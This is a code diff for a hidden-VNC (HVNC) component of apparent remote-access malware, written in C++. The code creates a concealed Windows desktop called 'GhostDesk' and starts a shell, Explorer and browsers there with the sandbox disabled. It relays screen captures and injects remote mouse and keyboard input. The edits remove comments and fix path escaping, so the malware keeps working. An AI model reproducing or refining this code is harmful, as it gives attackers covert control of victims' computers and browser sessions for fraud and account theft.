@@ -10,9 +10,6 @@ using namespace Gdiplus;
 using namespace std;
 
 // --- HVNC Core ---
-// Creates a hidden desktop and launches applications inside it.
-// Uses simple GDI capture for streaming.
-
 extern void SendPacket(int type, const char* data, int len);
 extern void CaptureAndSendScreen();
 
@@ -35,13 +32,9 @@ void StartBrowser(const char* browserName, const char* exePath, const char* user
     char dstPath[MAX_PATH];
     snprintf(dstPath, sizeof(dstPath), "%sGhost%s", tempPath, browserName);
     
-    // Clone Profile
-    // CopyDir(userDataPath, dstPath); // Cloning takes too long and CPU
-    // Instead, we just use a fresh profile or specific essential files
     CreateDirectoryA(dstPath, NULL);
 
     char cmd[2048];
-    // Launch with flags to disable GPU/Sandbox to run in hidden desk
     if (strstr(browserName, "Chrome") || strstr(browserName, "Edge") || strstr(browserName, "Brave")) {
         snprintf(cmd, sizeof(cmd), "\"%s\" --user-data-dir=\"%s\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-software-rasterizer", exePath, dstPath);
     } else {
@@ -57,9 +50,9 @@ void StartBrowser(const char* browserName, const char* exePath, const char* user
 }
 
 void StartFirefox() {
-    // Firefox needs -no-remote -CreateProfile
     char path[MAX_PATH] = "";
-    ExpandEnvironmentStringsA("%ProgramFiles%\Mozilla Firefox\firefox.exe", path, MAX_PATH);
+    // Double backslashes for proper C++ string escaping
+    ExpandEnvironmentStringsA("%ProgramFiles%\\Mozilla Firefox\\firefox.exe", path, MAX_PATH);
     
     if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
         char cmd[1024];
@@ -81,7 +74,7 @@ void StartFirefox() {
 void StartExplorer() {
     char path[MAX_PATH] = "";
     GetWindowsDirectoryA(path, MAX_PATH);
-    strncat(path, "\explorer.exe", sizeof(path) - strlen(path) - 1);
+    strncat(path, "\\explorer.exe", sizeof(path) - strlen(path) - 1);
     
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
@@ -98,7 +91,6 @@ void StartHVNC() {
     hHiddenDesk = CreateDesktopA("GhostDesk", NULL, NULL, 0, GENERIC_ALL, NULL);
     
     if (hHiddenDesk) {
-        // Start basic shell in hidden desk
         STARTUPINFOA si = {0};
         PROCESS_INFORMATION pi = {0};
         si.cb = sizeof(si);
@@ -106,9 +98,6 @@ void StartHVNC() {
         
         char cmd[] = "cmd.exe";
         CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-        
-        // Start Explorer (Optional, heavy)
-        // StartExplorer(); 
     }
 }
 
@@ -129,18 +118,16 @@ void ExecuteInHiddenDesk(const char* appCmd) {
     if (strstr(appCmd, "explorer")) {
         char path[MAX_PATH] = "";
         GetWindowsDirectoryA(path, MAX_PATH);
-        strncat(path, "\explorer.exe", sizeof(path) - strlen(path) - 1);
+        strncat(path, "\\explorer.exe", sizeof(path) - strlen(path) - 1);
         strncpy(cmd, path, sizeof(cmd)-1);
     } else if (strstr(appCmd, "browser")) {
-        // Try to find default browser
         char path[MAX_PATH] = "";
-        ExpandEnvironmentStringsA("%ProgramFiles%\Google\Chrome\Application\chrome.exe", path, MAX_PATH);
+        ExpandEnvironmentStringsA("%ProgramFiles%\\Google\\Chrome\\Application\\chrome.exe", path, MAX_PATH);
         if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
             StartBrowser("Chrome", path, "");
             return;
         }
-        // Fallback to Edge
-        ExpandEnvironmentStringsA("%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", path, MAX_PATH);
+        ExpandEnvironmentStringsA("%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe", path, MAX_PATH);
         if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
             StartBrowser("Edge", path, "");
             return;
@@ -155,13 +142,9 @@ void ExecuteInHiddenDesk(const char* appCmd) {
 
 void HandleHVNCInput(const char* data) {
     if (!hHiddenDesk) return;
-    
-    // Switch context to hidden desktop to inject input
     SetThreadDesktop(hHiddenDesk);
     
-    // Parse Input (x,y,flags) or (Kkeycode,down)
     if (data[0] == 'K') {
-        // Keyboard
         int k, d;
         if (sscanf(data+1, "%d,%d", &k, &d) == 2) {
             INPUT i = {0};
@@ -171,16 +154,13 @@ void HandleHVNCInput(const char* data) {
             SendInput(1, &i, sizeof(INPUT));
         }
     } else {
-        // Mouse
         float rx, ry; int f;
         if (sscanf(data, "%f,%f,%d", &rx, &ry, &f) == 3) {
             int w = GetSystemMetrics(SM_CXSCREEN);
             int h = GetSystemMetrics(SM_CYSCREEN);
             int x = (int)(rx * w);
             int y = (int)(ry * h);
-            
             SetCursorPos(x, y);
-            
             INPUT i = {0};
             i.type = INPUT_MOUSE;
             if (f & 1) { i.mi.dwFlags = MOUSEEVENTF_LEFTDOWN; SendInput(1, &i, sizeof(INPUT)); }
@@ -189,8 +169,6 @@ void HandleHVNCInput(const char* data) {
             if (f & 8) { i.mi.dwFlags = MOUSEEVENTF_RIGHTUP; SendInput(1, &i, sizeof(INPUT)); }
         }
     }
-    
-    // Restore
     SetThreadDesktop(hOriginalDesk);
 }
 
